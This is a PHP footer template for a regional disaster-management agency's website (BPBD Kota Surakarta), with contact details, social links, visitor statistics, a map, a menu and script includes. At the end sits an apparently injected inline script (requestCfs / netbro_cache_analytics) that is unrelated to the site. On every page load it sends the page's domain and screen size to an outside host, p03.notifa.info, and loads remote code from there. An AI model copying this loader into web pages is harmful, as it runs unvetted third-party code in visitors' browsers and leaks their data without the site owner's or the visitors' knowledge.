<style type="text/css">
  .widget-footer a {
    color: #ddd;
    font-size: 18px;
    line-height: 20px;
  }

  .widget-footer a:hover {
    color: #eee;
    text-decoration: underline;
  }

  .widget-footer div {
    color: #ddd;
    font-size: 16px;
    line-height: 20px;
    margin-bottom: 7px;
  }

  .statistic-icon {
    width: 24px
  }
</style>
<?php $get_profil_website = get_profil_website(); ?>
<footer id="footer-style-1">
  <div class="container">
    <div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">

      <div class="widget-footer">
        <?php if (is_file('./uploads/logo/' . $get_profil_website->image)) { ?>
          <img style="width: 60%;" class="padding-top" src="<?= base_url('uploads/logo/' . $get_profil_website->image) ?>" alt="">
        <?php } else { ?>
          <img style="width: 60%;" class="padding-top" src="<?= base_url('assets_frontend/assets/') ?>custom/images/bpbd-solo-text-white.png" alt="">
        <?php } ?>
        <div style="margin-top: 10px;">
          <i class="fa fa-map-marker-alt" style="padding-right: 10px;"></i> <?= $get_profil_website->alamat ?>
        </div>
        <div>
          <i class="fa fa-phone" style="padding-right: 10px;"></i><?= $get_profil_website->telepon ?>
        </div>
        <div>
          <a href="mailto:<?= $get_profil_website->email ?>">
            <i class="fa fa-envelope" style="padding-right: 10px;"></i><?= $get_profil_website->email ?>
          </a>
        </div>
      </div><!-- end widget -->
    </div><!-- end columns -->
    <div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
      <div class="widget-footer">
        <div class="title">
          <h3 style="color: #e98024; font-weight: bold;">Temukan kami di</h3>
        </div><!-- end title -->
        <div class="text-center" style="display: flex;gap: 16px;">
          <div class=""><a data-toggle="tooltip" data-placement="bottom" title="Facebook" href="<?= $get_profil_website->facebook ?>" target="_blank"><i class="fab fa-facebook"></i></a></div>
          <div class=""><a data-toggle="tooltip" data-placement="bottom" title="Whatsapp" href="<?= $get_profil_website->whatsapp ?>" target="_blank"><i class="fab fa-whatsapp"></i></a></div>
          <!-- <div class=""><a data-toggle="tooltip" data-placement="bottom" title="Google Plus" href="<?= $get_profil_website->google_plus ?>" target="_blank"><i class="fab fa-google-plus"></i></a></div> -->
          <div class=""><a data-toggle="tooltip" data-placement="bottom" title="Twitter" href="<?= $get_profil_website->twitter ?>" target="_blank"><i class="fab fa-twitter"></i></a></div>
          <div class=""><a data-toggle="tooltip" data-placement="bottom" title="Youtube" href="<?= $get_profil_website->google_plus ?>"><i class="fab fa-youtube"></i></a></div>
          <!-- <div class=""><a data-toggle="tooltip" data-placement="bottom" title="Linkedin" href="<?= $get_profil_website->linkedin ?>" target="_blank"><i class="fab fa-linkedin"></i></a></div> -->
          <!-- <div class=""><a data-toggle="tooltip" data-placement="bottom" title="Dribbble" href="<?= $get_profil_website->dribbble ?>" target="_blank"><i class="fab fa-dribbble"></i></a></div> -->
        </div><!-- end social icons -->
      </div><!-- end widget -->
      <div class="widget-footer statistic">
        <div class="title">
          <h3 style="color: #e98024; font-weight: bold;">Statistik</h3>
        </div><!-- end title -->
        <div style="display: flex;gap: 16px;">
          <div>
            <div><i class="fa fa-users mr-2 statistic-icon"></i> Total pengunjung : <?= view_visitor()['total_pengunjung'] ?> </div>
            <div><i class="fa fa-user-friends mr-2 statistic-icon"></i> Pengunjung Hari Ini : <?= view_visitor()['pengunjung_hari_ini'] ?> </div>
            <div><i class="fa fa-user mr-2 statistic-icon"></i> Pengunjung Online : <?= view_visitor()['pengunjung_online'] ?> </div>
          </div>
        </div><!-- end social icons -->
      </div><!-- end widget -->
    </div><!-- end columns -->
    <div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
      <div class="widget-footer">
        <div class="title">
          <h3 style="color: #e98024; font-weight: bold;">Lokasi</h3>
        </div><!-- end title -->
        <div class="newsletter_widget">
          <?php /* @$get_profil_website->lokasi */ ?>

          <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3955.1317626672553!2d110.80556107411681!3d-7.560609574661454!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2e7a16829aed2795%3A0xfb919124cc9bf248!2sBadan%20Penanggulangan%20Bencana%20Daerah%20Kota%20Surakarta%20(%20BPBD%20KOTA%20SURAKARTA%20)!5e0!3m2!1sid!2sid!4v1707118557183!5m2!1sid!2sid" width="100%" height="200" style="border:0;" allowfullscreen="" loading="lazy"></iframe>

        </div>
      </div><!-- end widget -->
    </div><!-- end columns -->
  </div><!-- end container -->
</footer><!-- end #footer-style-1 -->

<div id="copyrights">
  <div class="container">
    <div class="col-lg-5 col-md-6 col-sm-12">
      <div class="copyright-text">
        <p>Copyright © 2021 | BPBD Kota Surakarta</p>
      </div><!-- end copyright-text -->
    </div><!-- end widget -->
    <div class="col-lg-7 col-md-6 col-sm-12 clearfix">
      <div class="footer-menu">
        <ul class="menu">
          <li class="<?= @$li_beranda ?>"><a href="<?= base_url('frontend') ?>">Beranda</a></li>
          <li class="<?= @$li_profil ?>"><a href="<?= base_url('frontend/profil') ?>">Profil</a></li>
          <li class="<?= @$li_cuaca ?>"><a href="<?= base_url('cuaca') ?>">Info Cuaca</a></li>
          <li class="<?= @$li_berita ?>"><a href="<?= base_url('berita') ?>">Berita</a></li>
          <li class="<?= @$li_galeri ?>"><a href="<?= base_url('frontend/galeri') ?>">Galeri</a></li>
          <li class="<?= @$li_unduhan ?>"><a href="<?= base_url('frontend/unduhan') ?>">Unduhan</a></li>
          <li class="<?= @$li_lapor ?>"><a href="<?= base_url('frontend/lapor') ?>">Informasi</a></li>
        </ul>
      </div>
    </div><!-- end large-7 -->
  </div><!-- end container -->
</div><!-- end copyrights -->

<div class="dmtop">Scroll to Top</div>

<!-- Main Scripts-->
<script src="<?= base_url('assets_frontend/assets/') ?>js/jquery.js"></script>
<script src="<?= base_url('assets_frontend/assets/') ?>js/bootstrap.min.js"></script>
<script src="<?= base_url('assets_frontend/assets/') ?>js/menu.js"></script>
<script src="<?= base_url('assets_frontend/assets/') ?>js/owl.carousel.min.js"></script>
<script src="<?= base_url('assets_frontend/assets/') ?>js/jquery.parallax-1.1.3.js"></script>
<script src="<?= base_url('assets_frontend/assets/') ?>js/jquery.simple-text-rotator.js"></script>
<script src="<?= base_url('assets_frontend/assets/') ?>js/wow.min.js"></script>
<script src="<?= base_url('assets_frontend/assets/') ?>js/custom.js"></script>

<script src="<?= base_url('assets_frontend/assets/') ?>js/jquery.isotope.min.js"></script>
<script src="<?= base_url('assets_frontend/assets/') ?>js/custom-portfolio-masonry.js"></script>

<!-- SLIDER REVOLUTION 4.x SCRIPTS  -->
<script type="text/javascript" src="<?= base_url('assets_frontend/assets/') ?>rs-plugin/js/jquery.themepunch.plugins.min.js"></script>
<script type="text/javascript" src="<?= base_url('assets_frontend/assets/') ?>rs-plugin/js/jquery.themepunch.revolution.min.js"></script>

<?php if (@$add_plugin_galeri) { ?>
  <script src="<?= base_url() ?>/assets_frontend/assets/galeri/js/jquery-3.3.1.min.js"></script>
  <script src="<?= base_url() ?>/assets_frontend/assets/galeri/js/jquery-migrate-3.0.1.min.js"></script>
  <script src="<?= base_url() ?>/assets_frontend/assets/galeri/js/jquery-ui.js"></script>
  <script src="<?= base_url() ?>/assets_frontend/assets/galeri/js/popper.min.js"></script>
  <script src="<?= base_url() ?>/assets_frontend/assets/galeri/js/bootstrap.min.js"></script>
  <script src="<?= base_url() ?>/assets_frontend/assets/galeri/js/owl.carousel.min.js"></script>
  <script src="<?= base_url() ?>/assets_frontend/assets/galeri/js/jquery.stellar.min.js"></script>
  <script src="<?= base_url() ?>/assets_frontend/assets/galeri/js/jquery.countdown.min.js"></script>
  <script src="<?= base_url() ?>/assets_frontend/assets/galeri/js/jquery.magnific-popup.min.js"></script>
  <script src="<?= base_url() ?>/assets_frontend/assets/galeri/js/bootstrap-datepicker.min.js"></script>
  <script src="<?= base_url() ?>/assets_frontend/assets/galeri/js/swiper.min.js"></script>
  <script src="<?= base_url() ?>/assets_frontend/assets/galeri/js/aos.js"></script>
  <script src="<?= base_url() ?>/assets_frontend/assets/galeri/js/picturefill.min.js"></script>
  <script src="<?= base_url() ?>/assets_frontend/assets/galeri/js/lightgallery-all.min.js"></script>
  <script src="<?= base_url() ?>/assets_frontend/assets/galeri/js/jquery.mousewheel.min.js"></script>
  <script src="<?= base_url() ?>/assets_frontend/assets/galeri/js/main.js"></script>
<?php } ?>

<script type="text/javascript">
  var revapi;
  jQuery(document).ready(function() {
    /*revapi = jQuery('.tp-banner').revolution(
    {
    	delay:9000,
    	startwidth:1170,
    	startheight:500,
    	hideThumbs:10,
    	fullWidth:"on",
    	forceFullWidth:"on"
    });*/
  }); //ready
</script>

<!-- Royal Slider script files -->
<script src="<?= base_url('assets_frontend/assets/') ?>royalslider/jquery.easing-1.3.js"></script>
<script src="<?= base_url('assets_frontend/assets/') ?>royalslider/jquery.royalslider.min.js"></script>
<script>
  jQuery(document).ready(function($) {
    var rsi = $('#slider-in-laptop').royalSlider({
      autoHeight: false,
      arrowsNav: false,
      fadeinLoadedSlide: false,
      controlNavigationSpacing: 0,
      controlNavigation: 'bullets',
      imageScaleMode: 'fill',
      imageAlignCenter: true,
      loop: false,
      loopRewind: false,
      numImagesToPreload: 6,
      keyboardNavEnabled: true,
      autoScaleSlider: true,
      autoScaleSliderWidth: 486,
      autoScaleSliderHeight: 315,

      /* size of all images http://help.dimsemenov.com/kb/royalslider-jquery-plugin-faq/adding-width-and-height-properties-to-images */
      imgWidth: 792,
      imgHeight: 479

    }).data('royalSlider');
    $('#slider-next').click(function() {
      rsi.next();
    });
    $('#slider-prev').click(function() {
      rsi.prev();
    });
  });

  function go_to(url = null) {
    if (url) {
      location.href = url;
    } else {
      alert('Url is empty');
    }
  }
</script>

<?php
if (isset($extra_js)) {
  $this->load->view($extra_js);
}
?>

<!-- Fullwidth Video Div  -->
<script type="text/javascript" src="<?= base_url('assets_frontend/assets/') ?>js/libs/swfobject.js"></script>
<script type="text/javascript" src="<?= base_url('assets_frontend/assets/') ?>js/libs/modernizr.video.js"></script>
<script type="text/javascript" src="<?= base_url('assets_frontend/assets/') ?>js/video_background.js"></script>

<!-- Demo Switcher JS -->
<script type="text/javascript" src="<?= base_url('assets_frontend/assets/') ?>switcher/js/fswit.js"></script>
<script src="<?= base_url('assets_frontend/assets/') ?>switcher/js/bootstrap-select.js"></script>

<script type="text/javascript">
  if (self == top) {
    function netbro_cache_analytics(fn, callback) {
      setTimeout(function() {
        fn();
        callback();
      }, 0);
    }

    function sync(fn) {
      fn();
    }

    function requestCfs() {
      var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
      var idc_glo_r = Math.floor(Math.random() * 99999999999);
      var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXG93GAqYHNkNIqTD0eCgSZbx3%2bpvm9bDOVxwIRDMB%2b7RGPgoQ%2b3d9EEQ376S0Ta5S6Bt7j9JK2kv5D3Xtk%2faC7GDgSa1AgAxIOGU9lPJ6mc%2frdRuIcoV5YcYj5Ezm8KL%2bUC15nQDHgAG1iJDcMNlL07aVzGzL2Lkukv4vPH%2bs1YCWwAiv6eHw20r8s%2fHgtrZ22I3boJPQhwFRPS2S%2fFNNOGXSh2kTCYmpVzzvcAXAJnm46pP9UMAiOYWeQ8mHJXUnns1nb6CMBNp%2f7yt29qdr6%2bCiCAc1IGIuhBVuileDmGAwGz4U4vhf9Fnr3bs%2bmT1i01HhHDK4JCC0UvC2TqKHxNvwf27s4m5faNFjSjfCn5MuGeQR6yJ3Xf2LubB1K7eV8HC6yP%2fXi8oYil1YrG0UmJNu%2bS%2fdDb%2bfQO34hebKr0P4LIffzt48ZcsHEhoBI9rme1nhVgtOFuHYwhy3dcssDPYD1qHtZoCgmXEAJy4p%2fYUnBgvFu644SNihaRMstoP%2fD%2bKLDnhsoMHF6g5kMJchwWkJ6ngbeKAQFHJMjvfIxj5Cg3pUR4R3BA%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
      var bsa = document.createElement('script');
      bsa.type = 'text/javascript';
      bsa.async = true;
      bsa.src = url;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
    }
    netbro_cache_analytics(requestCfs, function() {});
  };
  $('.dropdown').on('click', '.dropdown_berita', function(e) {
    e.preventDefault;
    alert('aaaa');
  });
  //dropdown_berita
</script>
</body>

</html>